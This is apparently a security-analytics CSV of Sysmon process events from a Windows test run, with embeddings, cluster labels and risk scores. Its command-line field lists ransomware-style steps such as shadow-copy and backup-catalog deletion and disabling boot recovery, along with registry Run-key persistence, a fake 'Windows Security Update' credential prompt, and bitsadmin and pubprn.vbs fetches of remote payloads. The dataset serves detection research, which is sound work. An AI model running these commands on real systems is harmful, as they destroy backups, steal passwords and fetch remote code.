Timestamp,Computer,Provider,EventID,CommandLine,Embedding,Cluster_DBSCAN,Cluster_KMeans,DBSCANClusterDescription,DBSCANClusterRiskScore
2019-07-19T14:44:09.150760Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""sc.exe stop AtomicTestService""","[-0.02432065 -0.02185048 -0.0024948  ...  0.01651597  0.00236834
 -0.00936168]",3,26,"Commands related to managing a service named AtomicTestService, including starting, stopping, and deleting the service which could indicate potential misuse or administrative changes.",6
2019-07-19T14:44:09.176040Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,sc.exe  stop AtomicTestService,"[ 0.00736618 -0.02639722  0.01404287 ...  0.01568918 -0.00266822
 -0.01725106]",4,26,"This cluster consists of commands that manage a Windows service named 'AtomicTestService'. These commands include starting, stopping, and deleting the service, which can have implications for system stability and security.",6
2019-07-19T14:44:09.253714Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""sc.exe delete AtomicTestService""","[-0.02740363 -0.02570734 -0.00099361 ...  0.01389906 -0.00140207
 -0.00618686]",3,26,"Commands related to managing a service named AtomicTestService, including starting, stopping, and deleting the service which could indicate potential misuse or administrative changes.",6
2019-07-19T14:44:09.278042Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,sc.exe  delete AtomicTestService,"[ 0.00913471 -0.0270658   0.01327053 ...  0.01313244 -0.00603457
 -0.01341552]",4,26,"This cluster consists of commands that manage a Windows service named 'AtomicTestService'. These commands include starting, stopping, and deleting the service, which can have implications for system stability and security.",6
2019-07-19T14:44:09.351888Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ","[-0.0389697  -0.00693586  0.00092366 ... -0.00101171 -0.0054033
 -0.0097799 ]",1,57,"This cluster consists of multiple executions of the Windows Command Prompt (cmd.exe) with various cases of file path formatting. The commands do not execute any additional parameters, which might suggest they are either just opening a command line interface or not executing any potentially harmful commands.",2
2019-07-19T14:44:53.219598Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""REG ADD "" ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Atomic"" Red ""Team /t REG_SZ /F /D C:\Path\AtomicRedTeam.exe""","[-0.01364625 -0.02105029 -0.01152198 ...  0.00534507  0.02048657
 -0.01981285]",5,64,"This cluster contains commands that add a registry entry intended to execute a specific application (Atomic Red Team) at user login. The commands show a potential persistence mechanism, which can be risky if used maliciously.",7
2019-07-19T14:44:53.258049Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"REG  ADD "" ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Atomic"" Red ""Team /t REG_SZ /F /D C:\Path\AtomicRedTeam.exe","[ 0.01130166 -0.01901149 -0.00345153 ...  0.0062787   0.02118623
 -0.02817348]",5,64,"This cluster contains commands that add a registry entry intended to execute a specific application (Atomic Red Team) at user login. The commands show a potential persistence mechanism, which can be risky if used maliciously.",7
2019-07-19T14:44:53.330492Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""REG DELETE "" ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Atomic"" Red ""Team /f""","[-0.02590925 -0.03182486 -0.00510861 ...  0.00509795  0.00895163
 -0.01774684]",6,64,"This cluster involves commands that delete registry entries related to startup programs, specifically targeting keys that could be associated with malicious software or activities.",8
2019-07-19T14:44:53.349171Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"REG  DELETE "" ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Atomic"" Red ""Team /f","[-0.00954277 -0.03291484  0.00140981 ...  0.00342921  0.00573761
 -0.01177036]",6,64,"This cluster involves commands that delete registry entries related to startup programs, specifically targeting keys that could be associated with malicious software or activities.",8
2019-07-19T14:45:06.075725Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "" C:\Path\AtomicRedTeam.dll","[-0.00055088 -0.00555611  0.00044606 ...  0.00428216  0.0165577
 -0.01757115]",7,64,"This cluster involves commands that modify the Windows Registry to add an entry to the RunOnceEx key, specifically linking a dynamic link library (DLL) file. These commands indicate a potential persistence mechanism used by malicious software to ensure execution during system startup.",8
2019-07-19T14:45:06.137175Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,REG  ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d  C:\Path\AtomicRedTeam.dll,"[ 0.01803759 -0.0040806   0.00162556 ...  0.00306133  0.02121491
 -0.02052602]",7,64,"This cluster involves commands that modify the Windows Registry to add an entry to the RunOnceEx key, specifically linking a dynamic link library (DLL) file. These commands indicate a potential persistence mechanism used by malicious software to ensure execution during system startup.",8
2019-07-19T14:45:06.196458Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f""","[-0.01629927 -0.01033458 -0.00308422 ... -0.01273732  0.00973038
 -0.00195486]",135,61,"Commands deleting registry keys related to startup processes, potentially indicating attempts to manipulate system behavior or evade detection.",7
2019-07-19T14:45:06.213488Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,REG  DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f,"[ 0.00455147 -0.00586666  0.00390279 ... -0.01426389  0.00952352
 -0.0071462 ]",135,61,"Commands deleting registry keys related to startup processes, potentially indicating attempts to manipulate system behavior or evade detection.",7
2019-07-19T14:45:55.034352Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library C:\AtomicRedTeam\atomics\T1121\src\T1121.cs""","[-0.03178635  0.00136149 -0.00917867 ...  0.00692228 -0.00613491
 -0.00345567]",8,108,"This cluster consists of commands that invoke the C# compiler (csc.exe) to compile code files, particularly related to the Atomic Red Team's T1121 technique, which concerns the exploitation of the DCOM protocol. The use of System.EnterpriseServices indicates a focus on components related to enterprise services and remote execution.",6
2019-07-19T14:45:55.105804Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /r:System.EnterpriseServices.dll /target:library C:\AtomicRedTeam\atomics\T1121\src\T1121.cs,"[-0.0104069   0.01116716 -0.00678134 ...  0.00995505 -0.00564813
 -0.00973271]",8,108,"This cluster consists of commands that invoke the C# compiler (csc.exe) to compile code files, particularly related to the Atomic Red Team's T1121 technique, which concerns the exploitation of the DCOM protocol. The use of System.EnterpriseServices indicates a focus on components related to enterprise services and remote execution.",6
2019-07-19T14:45:55.621447Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\IEUser\AppData\Local\Temp\RESBED6.tmp"" ""c:\AtomicRedTeam\CSC5779B24A646D409A951966A058ABC4E3.TMP""","[-0.0200406   0.01760606 -0.01176156 ...  0.00230152 -0.00065297
 -0.02091123]",9,108,"This cluster consists of commands that invoke the 'cvtres.exe' utility from the .NET framework, typically used for resource file conversion and not directly associated with malicious activity. However, the commands are executed on files located in the 'AtomicRedTeam' directory, which is often associated with security testing and potentially malicious exercises. The execution of multiple instances raises a flag for potential abuse or misuse in a broader context.",5
2019-07-19T14:45:55.681219Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U T1121.dll""","[-0.03430121  0.01407452 -0.01001903 ... -0.0043602   0.01813727
 -0.01255825]",136,5,"This cluster contains commands related to unregistering a .NET assembly (T1121.dll) using the regasm tool. The use of regasm with the /U flag indicates that the assembly is being unregistered, which may imply an attempt to remove malicious components or legitimate software changes.",4
2019-07-19T14:45:55.699293Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe  /U T1121.dll,"[-0.01869415  0.02005425 -0.00552722 ... -0.00852957  0.02181949
 -0.01985168]",136,5,"This cluster contains commands related to unregistering a .NET assembly (T1121.dll) using the regasm tool. The use of regasm with the /U flag indicates that the assembly is being unregistered, which may imply an attempt to remove malicious components or legitimate software changes.",4
2019-07-19T14:45:56.033241Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""del T1121.dll""","[-0.03171212 -0.05096884 -0.00199737 ... -0.00129573 -0.0073476
 -0.01162232]",-1,15,Unclustered commands,0
2019-07-19T14:46:19.052666Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"" /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk C:\AtomicRedTeam\atomics\T1121\src\T1121.cs","[ 8.05574164e-05  2.24948511e-03 -8.30132607e-03 ...  7.18383957e-03
 -4.40463703e-03  2.34563253e-03]",8,108,"This cluster consists of commands that invoke the C# compiler (csc.exe) to compile code files, particularly related to the Atomic Red Team's T1121 technique, which concerns the exploitation of the DCOM protocol. The use of System.EnterpriseServices indicates a focus on components related to enterprise services and remote execution.",6
2019-07-19T14:46:19.443587Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\IEUser\AppData\Local\Temp\RES1BEA.tmp"" ""c:\AtomicRedTeam\CSC8EBD65DB33242A1BAD76494F485AF42.TMP""","[-0.02216776  0.01234174 -0.01125541 ...  0.00186433  0.00227885
 -0.0198644 ]",9,108,"This cluster consists of commands that invoke the 'cvtres.exe' utility from the .NET framework, typically used for resource file conversion and not directly associated with malicious activity. However, the commands are executed on files located in the 'AtomicRedTeam' directory, which is often associated with security testing and potentially malicious exercises. The execution of multiple instances raises a flag for potential abuse or misuse in a broader context.",5
2019-07-19T14:46:19.484316Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe"" T1121.dll","[-0.00604755  0.01872551 -0.009734   ...  0.00238895  0.01118184
 -0.01163476]",-1,48,Unclustered commands,0
2019-07-19T14:46:51.883827Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""powershell.exe -command { = System.Management.Automation.Internal.Host.InternalHost.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); echo .GetNetworkCredential().Password;}""","[-0.02252846  0.00206443 -0.00384575 ... -0.00418954 -0.00010401
 -0.0230947 ]",10,110,"This cluster contains commands that invoke PowerShell to prompt for user credentials, potentially for a misleading or malicious purpose related to a Windows security update.",9
2019-07-19T14:46:51.957887Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"powershell.exe  -command { = System.Management.Automation.Internal.Host.InternalHost.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); echo .GetNetworkCredential().Password;}","[-0.02039429  0.01346571 -0.00201431 ... -0.01296336  0.00200452
 -0.02472628]",10,110,"This cluster contains commands that invoke PowerShell to prompt for user credentials, potentially for a misleading or malicious purpose related to a Windows security update.",9
2019-07-19T14:47:37.096237Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg.exe import c:\AtomicRedTeam\atomics\T1103\T1103.reg""","[-0.04428261 -0.00637412 -0.01203332 ...  0.00251107  0.01431965
 -0.01018585]",167,116,"This cluster contains commands for importing a registry file using the reg.exe tool. The commands suggest possible modifications to the Windows Registry, potentially for malicious purposes, as they leverage techniques from the Atomic Red Team framework, which is often used in security testing and may mimic malware behavior.",8
2019-07-19T14:47:37.127263Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg.exe  import c:\AtomicRedTeam\atomics\T1103\T1103.reg,"[-0.01743032  0.01551852 -0.00653824 ... -0.00649716  0.01622051
 -0.00123595]",167,116,"This cluster contains commands for importing a registry file using the reg.exe tool. The commands suggest possible modifications to the Windows Registry, potentially for malicious purposes, as they leverage techniques from the Atomic Red Team framework, which is often used in security testing and may mimic malware behavior.",8
2019-07-19T14:47:40.691438Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""vssadmin.exe delete shadows /all /quiet""","[-0.02350457 -0.02513872 -0.00443604 ... -0.01530657 -0.00210227
 -0.00968236]",168,99,"Commands related to the deletion of all Volume Shadow Copies, which could lead to data loss and hinder recovery efforts.",9
2019-07-19T14:47:40.706040Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,vssadmin.exe  delete shadows /all /quiet,"[ 0.01931354 -0.00827821  0.0038099  ... -0.01041806  0.00524675
 -0.0165427 ]",168,102,"Commands related to the deletion of all Volume Shadow Copies, which could lead to data loss and hinder recovery efforts.",9
2019-07-19T14:47:45.585327Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""wbadmin.exe delete catalog -quiet""","[-0.01485872 -0.01917476 -0.00200167 ... -0.02875526 -0.00836404
 -0.01229521]",169,102,"The commands in this cluster involve the use of 'wbadmin.exe' to delete the backup catalog quietly, suggesting potential risk in data loss or disruption of backup functionalities.",6
2019-07-19T14:47:45.624944Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,wbadmin.exe  delete catalog -quiet,"[ 0.01537332 -0.00924658  0.00121582 ... -0.02593277 -0.00698434
 -0.00874543]",169,102,"The commands in this cluster involve the use of 'wbadmin.exe' to delete the backup catalog quietly, suggesting potential risk in data loss or disruption of backup functionalities.",6
2019-07-19T14:47:45.773400Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\wbengine.exe""","[-1.01319244e-02 -1.32311014e-02 -6.45296677e-05 ...  3.16403515e-04
  2.12454889e-03 -3.62926237e-02]",-1,137,Unclustered commands,0
2019-07-19T14:47:45.958874Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\vds.exe,"[ 0.0162132  -0.01077061 -0.00466917 ...  0.00379191  0.00566818
 -0.03855649]",206,65,"This cluster consists of commands involving Volume Shadow Copy and Virtual Disk Service executables, which are essential for managing volumes and backups in Windows. Their usage can indicate regular system administration but may also be exploited for malicious intent such as data exfiltration or system restore manipulation.",4
2019-07-19T14:47:51.816821Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures""","[ 0.01620556  0.01016792 -0.00490111 ...  0.00762235  0.00096803
 -0.00632089]",170,62,"This cluster consists of commands related to modifying the boot configuration settings in Windows, specifically to ignore boot failures. These commands could be part of an evasion technique to mask issues during system boot or to assist in maintaining system availability after a failure.",7
2019-07-19T14:47:51.865963Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bcdedit.exe  /set {default} bootstatuspolicy ignoreallfailures,"[ 0.03294088  0.01591306  0.0055215  ... -0.00349405 -0.00121142
  0.00549015]",170,62,"This cluster consists of commands related to modifying the boot configuration settings in Windows, specifically to ignore boot failures. These commands could be part of an evasion technique to mask issues during system boot or to assist in maintaining system availability after a failure.",7
2019-07-19T14:47:51.997980Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bcdedit.exe /set {default} recoveryenabled no""","[ 0.00393343 -0.00095602 -0.0026974  ...  0.00292108 -0.00448683
 -0.00845008]",171,62,"Commands modifying boot configuration data, specifically disabling recovery options, indicating potential risk for system recovery and repair processes.",6
2019-07-19T14:47:52.010791Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bcdedit.exe  /set {default} recoveryenabled no,"[ 0.01862958 -0.00165408  0.01012992 ... -0.00446347  0.00075309
 -0.00156123]",171,62,"Commands modifying boot configuration data, specifically disabling recovery options, indicating potential risk for system recovery and repair processes.",6
2019-07-19T14:47:57.227966Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""sdelete.exe C:\some\file.txt""","[-0.01989677 -0.03235288 -0.00709148 ... -0.0125196  -0.0038346
 -0.00666612]",-1,15,Unclustered commands,0
2019-07-19T14:48:04.103366Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1""","[-0.01561216 -0.02127194 -0.00490636 ... -0.00388099 -0.00119168
 -0.02028699]",11,88,"The commands in this cluster utilize BITS (Background Intelligent Transfer Service) to download a potentially malicious script from a known repository, suggesting an intention to execute unauthorized activities.",8
2019-07-19T14:48:04.131410Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bitsadmin.exe   /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1,"[-0.00163069 -0.01402487 -0.00680968 ... -0.01114798 -0.00761307
 -0.02169915]",151,88,This cluster contains commands that utilize bitsadmin.exe to download and manage files from a potentially malicious URL. The use of bitsadmin to fetch content from external sources raises concerns about the integrity and trustworthiness of the source.,7
2019-07-19T14:48:30.640915Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /create AtomicBITS""","[-0.01304879 -0.01596731 -0.00518276 ...  0.00598774 -0.00112017
 -0.00907167]",12,14,"This cluster involves the use of bitsadmin.exe to manage Background Intelligent Transfer Service (BITS) jobs. The commands demonstrate the creation, completion, and resumption of a BITS job named 'AtomicBITS'. BITS can be exploited for malicious purposes, such as exfiltrating data or downloading malware in a stealthy manner.",7
2019-07-19T14:48:30.660877Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bitsadmin.exe  /create AtomicBITS,"[-0.0037927  -0.01254819  0.00357801 ... -0.00163041 -0.00833194
 -0.01209176]",137,131,"Commands related to the BITS (Background Intelligent Transfer Service) which are often used for downloading or uploading files asynchronously. While the usage of BITS can be legitimate, its features can also be exploited for malicious file transfers.",5
2019-07-19T14:48:30.799468Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1""","[-0.01336996 -0.02915416 -0.00868666 ...  0.00066038  0.00217739
 -0.02100994]",11,88,"The commands in this cluster utilize BITS (Background Intelligent Transfer Service) to download a potentially malicious script from a known repository, suggesting an intention to execute unauthorized activities.",8
2019-07-19T14:48:30.807486Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bitsadmin.exe  /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1,"[ 0.00079117 -0.02235818 -0.00659667 ... -0.00898666  0.00251007
 -0.01761694]",151,88,This cluster contains commands that utilize bitsadmin.exe to download and manage files from a potentially malicious URL. The use of bitsadmin to fetch content from external sources raises concerns about the integrity and trustworthiness of the source.,7
2019-07-19T14:48:30.900988Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe C:\Windows\Temp\bitsadmin_flag.ps1""","[-0.00283612 -0.03312213 -0.00530987 ...  0.0051843  -0.0018154
 -0.01437971]",13,14,This cluster contains commands involving the use of bitsadmin.exe with a specific notify command line that launches notepad.exe and points to a PowerShell script. The use of BITS (Background Intelligent Transfer Service) for setting a notification command can be indicative of a technique used by attackers to maintain persistence or execute scripts in the background.,7
2019-07-19T14:48:30.917348Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bitsadmin.exe  /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe C:\Windows\Temp\bitsadmin_flag.ps1,"[ 0.00154507 -0.03024193 -0.00529738 ...  0.00493341 -0.00280365
 -0.01449393]",13,14,This cluster contains commands involving the use of bitsadmin.exe with a specific notify command line that launches notepad.exe and points to a PowerShell script. The use of BITS (Background Intelligent Transfer Service) for setting a notification command can be indicative of a technique used by attackers to maintain persistence or execute scripts in the background.,7
2019-07-19T14:48:31.012222Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /complete AtomicBITS""","[-0.01509893 -0.02000273 -0.00516837 ...  0.00057431 -0.0044082
 -0.00721037]",12,14,"This cluster involves the use of bitsadmin.exe to manage Background Intelligent Transfer Service (BITS) jobs. The commands demonstrate the creation, completion, and resumption of a BITS job named 'AtomicBITS'. BITS can be exploited for malicious purposes, such as exfiltrating data or downloading malware in a stealthy manner.",7
2019-07-19T14:48:31.041710Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bitsadmin.exe  /complete AtomicBITS,"[ 0.00375772 -0.00859948  0.00021438 ... -0.00402671 -0.00518557
 -0.00484985]",137,131,"Commands related to the BITS (Background Intelligent Transfer Service) which are often used for downloading or uploading files asynchronously. While the usage of BITS can be legitimate, its features can also be exploited for malicious file transfers.",5
2019-07-19T14:48:31.134374Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /resume AtomicBITS""","[-0.03161127  0.00111981 -0.00443093 ...  0.00736754 -0.00426737
 -0.00136701]",12,14,"This cluster involves the use of bitsadmin.exe to manage Background Intelligent Transfer Service (BITS) jobs. The commands demonstrate the creation, completion, and resumption of a BITS job named 'AtomicBITS'. BITS can be exploited for malicious purposes, such as exfiltrating data or downloading malware in a stealthy manner.",7
2019-07-19T14:48:31.157171Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bitsadmin.exe  /resume AtomicBITS,"[-2.96368822e-02  6.97338395e-03  2.34211202e-05 ...  3.98159027e-03
  2.20973184e-03 -5.76872379e-04]",-1,131,Unclustered commands,0
2019-07-19T14:48:36.834888Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "" script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct","[ 0.00810281 -0.00541291 -0.00831623 ... -0.00582504 -0.01354884
 -0.005814  ]",14,22,"This cluster contains multiple executions of the `cscript.exe` command using the VBScript located in the Printing Admin Scripts folder. The scripts are pulling scripts from external URLs, indicating possible malicious activity, especially since they use localhost and include remote payloads.",8
